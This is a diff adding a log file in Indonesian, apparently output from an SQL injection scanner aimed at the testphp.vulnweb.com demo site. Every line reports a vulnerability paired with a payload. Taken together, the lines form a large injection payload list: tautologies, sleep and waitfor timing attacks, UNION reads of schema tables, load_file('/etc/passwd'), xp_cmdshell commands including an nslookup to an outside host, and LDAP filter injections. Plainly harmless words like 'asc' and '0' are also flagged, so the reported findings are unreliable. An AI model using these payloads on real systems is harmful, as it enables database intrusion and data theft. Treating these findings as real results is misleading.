@@ -1,0 +1,263 @@
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)%20or%20('x'='x dengan payload: )%20or%20('x'='x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20or%201=1 dengan payload: %20or%201=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; execute immediate 'sel' || 'ect us' || 'er' dengan payload: ; execute immediate 'sel' || 'ect us' || 'er'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=benchmark(10000000,MD5(1))# dengan payload: benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=update dengan payload: update
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=";waitfor delay '0:0:__TIME__'-- dengan payload: ";waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1) or pg_sleep(__TIME__)-- dengan payload: 1) or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=||(elt(-3+5,bin(15),ord(10),hex(char(45)))) dengan payload: ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi"""") or (""""a""""=""""a""" dengan payload: hi"""") or (""""a""""=""""a"""
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=delete dengan payload: delete
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=like dengan payload: like
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=" or sleep(__TIME__)# dengan payload: " or sleep(__TIME__)#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=pg_sleep(__TIME__)-- dengan payload: pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=*(|(objectclass=*)) dengan payload: *(|(objectclass=*))
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @q nvarchar (200) 0x730065006c00650063 ... dengan payload: declare @q nvarchar (200) 0x730065006c00650063 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 0=0 # dengan payload:  or 0=0 #
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=insert dengan payload: insert
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1) or sleep(__TIME__)# dengan payload: 1) or sleep(__TIME__)#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or ('a'='a dengan payload: ) or ('a'='a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; exec xp_regread dengan payload: ; exec xp_regread
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=*| dengan payload: *|
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=@var select @var as var into temp end -- dengan payload: @var select @var as var into temp end --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1)) or benchmark(10000000,MD5(1))# dengan payload: 1)) or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=asc dengan payload: asc
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=(||6) dengan payload: (||6)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a"""" or 3=3--""" dengan payload: a"""" or 3=3--"""
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=" or benchmark(10000000,MD5(1))# dengan payload: " or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=# from wapiti dengan payload: # from wapiti
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 0=0 -- dengan payload:  or 0=0 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1 waitfor delay '0:0:10'-- dengan payload: 1 waitfor delay '0:0:10'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'a'='a dengan payload:  or 'a'='a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi or 1=1 --" dengan payload: hi or 1=1 --"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or a = a dengan payload: or a = a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= UNION ALL SELECT dengan payload:  UNION ALL SELECT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or sleep(__TIME__)=' dengan payload: ) or sleep(__TIME__)='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)) or benchmark(10000000,MD5(1))# dengan payload: )) or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi' or 'a'='a dengan payload: hi' or 'a'='a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=0 dengan payload: 0
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=21% dengan payload: 21%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=limit dengan payload: limit
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1 dengan payload:  or 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 2 > 1 dengan payload:  or 2 > 1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=")) or benchmark(10000000,MD5(1))# dengan payload: ")) or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=PRINT dengan payload: PRINT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi') or ('a'='a dengan payload: hi') or ('a'='a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 3=3 dengan payload:  or 3=3
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=));waitfor delay '0:0:__TIME__'-- dengan payload: ));waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a' waitfor delay '0:0:10'-- dengan payload: a' waitfor delay '0:0:10'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1;(load_file(char(47,101,116,99,47,112,97,115, ... dengan payload: 1;(load_file(char(47,101,116,99,47,112,97,115, ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or%201=1 dengan payload: or%201=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1 or sleep(__TIME__)# dengan payload: 1 or sleep(__TIME__)#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 1=1 dengan payload: or 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= and 1 in (select var from temp)-- dengan payload:  and 1 in (select var from temp)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or '7659'='7659 dengan payload:  or '7659'='7659
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'text' = n'text' dengan payload:  or 'text' = n'text'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= -- dengan payload:  --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1 or ''=' dengan payload:  or 1=1 or ''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar (200) select @s = 0x73656c6 ... dengan payload: declare @s varchar (200) select @s = 0x73656c6 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=exec xp dengan payload: exec xp
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; exec master..xp_cmdshell 'ping 172.10.1.255'-- dengan payload: ; exec master..xp_cmdshell 'ping 172.10.1.255'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=3.10E+17 dengan payload: 3.10E+17
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or pg_sleep(__TIME__)--" dengan payload:  or pg_sleep(__TIME__)--"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' AND email IS NULL; -- dengan payload: x' AND email IS NULL; --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=& dengan payload: &
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=admin' or ' dengan payload: admin' or '
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'unusual' = 'unusual' dengan payload:  or 'unusual' = 'unusual'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=// dengan payload: //
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=truncate dengan payload: truncate
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1) or benchmark(10000000,MD5(1))# dengan payload: 1) or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=\x27UNION SELECT dengan payload: \x27UNION SELECT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar(200) select @s = 0x77616974 ... dengan payload: declare @s varchar(200) select @s = 0x77616974 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=tz_offset dengan payload: tz_offset
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=sqlvuln dengan payload: sqlvuln
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id="));waitfor delay '0:0:__TIME__'-- dengan payload: "));waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=||6 dengan payload: ||6
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or%201=1 -- dengan payload: or%201=1 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%2A%28%7C%28objectclass%3D%2A%29%29 dengan payload: %2A%28%7C%28objectclass%3D%2A%29%29
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or a=a dengan payload: or a=a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) union select * from information_schema.tables; dengan payload: ) union select * from information_schema.tables;
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=PRINT @@variable dengan payload: PRINT @@variable
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or isNULL(1/0) /* dengan payload: or isNULL(1/0) /*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=26 % dengan payload: 26 %
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or ""a""=""a" dengan payload:  or ""a""=""a"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=(sqlvuln) dengan payload: (sqlvuln)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' AND members.email IS NULL; -- dengan payload: x' AND members.email IS NULL; --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1-- dengan payload:  or 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= and 1=( if((load_file(char(110,46,101,120,11 ... dengan payload:  and 1=( if((load_file(char(110,46,101,120,11 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=0x770061006900740066006F0072002000640065006C00 ... dengan payload: 0x770061006900740066006F0072002000640065006C00 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20'sleep%2050' dengan payload: %20'sleep%2050'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=as dengan payload: as
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1)) or pg_sleep(__TIME__)-- dengan payload: 1)) or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=/**/or/**/1/**/=/**/1 dengan payload: /**/or/**/1/**/=/**/1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= union all select @@version-- dengan payload:  union all select @@version--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=,@variable dengan payload: ,@variable
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=(sqlattempt2) dengan payload: (sqlattempt2)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or (EXISTS) dengan payload:  or (EXISTS)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=t'exec master..xp_cmdshell 'nslookup www.googl ... dengan payload: t'exec master..xp_cmdshell 'nslookup www.googl ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20$(sleep%2050) dengan payload: %20$(sleep%2050)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1 or benchmark(10000000,MD5(1))# dengan payload: 1 or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20or%20''=' dengan payload: %20or%20''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=||UTL_HTTP.REQUEST dengan payload: ||UTL_HTTP.REQUEST
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or pg_sleep(__TIME__)-- dengan payload:  or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi' or 'x'='x'; dengan payload: hi' or 'x'='x';
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or sleep(__TIME__)= dengan payload: ) or sleep(__TIME__)=
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'whatever' in ('whatever') dengan payload:  or 'whatever' in ('whatever')
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; begin declare @var varchar(8000) set @var=' ... dengan payload: ; begin declare @var varchar(8000) set @var=' ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= union select 1,load_file('/etc/passwd'),1,1,1; dengan payload:  union select 1,load_file('/etc/passwd'),1,1,1;
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=0x77616974666F722064656C61792027303A303A313027 ... dengan payload: 0x77616974666F722064656C61792027303A303A313027 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=exec(@s) dengan payload: exec(@s)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or pg_sleep(__TIME__)-- dengan payload: ) or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= union select dengan payload:  union select
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or sleep(__TIME__)# dengan payload:  or sleep(__TIME__)#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= select * from information_schema.tables-- dengan payload:  select * from information_schema.tables--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a' or 1=1-- dengan payload: a' or 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a' or 'a' = 'a dengan payload: a' or 'a' = 'a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar(22) select @s = dengan payload: declare @s varchar(22) select @s =
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 2 between 1 and 3 dengan payload:  or 2 between 1 and 3
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or a=a-- dengan payload:  or a=a--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or '1'='1 dengan payload:  or '1'='1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=| dengan payload: |
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or sleep(__TIME__)=' dengan payload:  or sleep(__TIME__)='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1 --' dengan payload:  or 1 --'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 0=0 #" dengan payload: or 0=0 #"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=having dengan payload: having
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a' dengan payload: a'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=" or isNULL(1/0) /* dengan payload: " or isNULL(1/0) /*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar (8000) select @s = 0x73656c ... dengan payload: declare @s varchar (8000) select @s = 0x73656c ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=â or 1=1 -- dengan payload: â or 1=1 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=char%4039%41%2b%40SELECT dengan payload: char%4039%41%2b%40SELECT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=order by dengan payload: order by
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=bfilename dengan payload: bfilename
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= having 1=1-- dengan payload:  having 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or benchmark(10000000,MD5(1))# dengan payload: ) or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or username like char(37); dengan payload:  or username like char(37);
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=;waitfor delay '0:0:__TIME__'-- dengan payload: ;waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1--" dengan payload:  or 1=1--"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' AND userid IS NULL; -- dengan payload: x' AND userid IS NULL; --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=*/* dengan payload: */*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'text' > 't' dengan payload:  or 'text' > 't'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= (select top 1 dengan payload:  (select top 1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or benchmark(10000000,MD5(1))# dengan payload:  or benchmark(10000000,MD5(1))#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=");waitfor delay '0:0:__TIME__'-- dengan payload: ");waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a' or 3=3-- dengan payload: a' or 3=3--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= -- &password= dengan payload:  -- &password=
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= group by userid having 1=1-- dengan payload:  group by userid having 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or ''=' dengan payload:  or ''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; exec master..xp_cmdshell dengan payload: ; exec master..xp_cmdshell
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20or%20x=x dengan payload: %20or%20x=x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=select dengan payload: select
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)) or sleep(__TIME__)=""" dengan payload: )) or sleep(__TIME__)="""
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=0x730065006c0065006300740020004000400076006500 ... dengan payload: 0x730065006c0065006300740020004000400076006500 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi' or 1=1 -- dengan payload: hi' or 1=1 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=") or pg_sleep(__TIME__)-- dengan payload: ") or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%20or%20'x'='x dengan payload: %20or%20'x'='x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 'something' = 'some'+'thing' dengan payload:  or 'something' = 'some'+'thing'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=exec sp dengan payload: exec sp
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=29 % dengan payload: 29 %
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=( dengan payload: (
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=Ã½ or 1=1 -- dengan payload: Ã½ or 1=1 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1 or pg_sleep(__TIME__)-- dengan payload: 1 or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=0 or 1=1 dengan payload: 0 or 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or (a=a dengan payload: ) or (a=a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=uni/**/on sel/**/ect dengan payload: uni/**/on sel/**/ect
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=replace dengan payload: replace
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%27%20or%201=1 dengan payload: %27%20or%201=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)) or pg_sleep(__TIME__)-- dengan payload: )) or pg_sleep(__TIME__)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%7C dengan payload: %7C
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' AND 1=(SELECT COUNT(*) FROM tabname); -- dengan payload: x' AND 1=(SELECT COUNT(*) FROM tabname); --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=&apos;%20OR dengan payload: &apos;%20OR
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; or '1'='1' dengan payload: ; or '1'='1'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @q nvarchar (200) select @q = 0x770061 ... dengan payload: declare @q nvarchar (200) select @q = 0x770061 ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1 or 1=1 dengan payload: 1 or 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=; exec ('sel' + 'ect us' + 'er') dengan payload: ; exec ('sel' + 'ect us' + 'er')
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=23 OR 1=1 dengan payload: 23 OR 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=/ dengan payload: /
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=anything' OR 'x'='x dengan payload: anything' OR 'x'='x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @q nvarchar (4000) select @q = dengan payload: declare @q nvarchar (4000) select @q =
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 0=0 -- dengan payload: or 0=0 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=desc dengan payload: desc
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=||'6 dengan payload: ||'6
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) dengan payload: )
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1)) or sleep(__TIME__)# dengan payload: 1)) or sleep(__TIME__)#
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 0=0 # dengan payload: or 0=0 #
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= select name from syscolumns where id = (sele ... dengan payload:  select name from syscolumns where id = (sele ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=hi or a=a dengan payload: hi or a=a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=*(|(mail=*)) dengan payload: *(|(mail=*))
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=password:*/=1-- dengan payload: password:*/=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=distinct dengan payload: distinct
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=);waitfor delay '0:0:__TIME__'-- dengan payload: );waitfor delay '0:0:__TIME__'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=to_timestamp_tz dengan payload: to_timestamp_tz
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=) or benchmark(10000000,MD5(1))#" dengan payload: ) or benchmark(10000000,MD5(1))#"
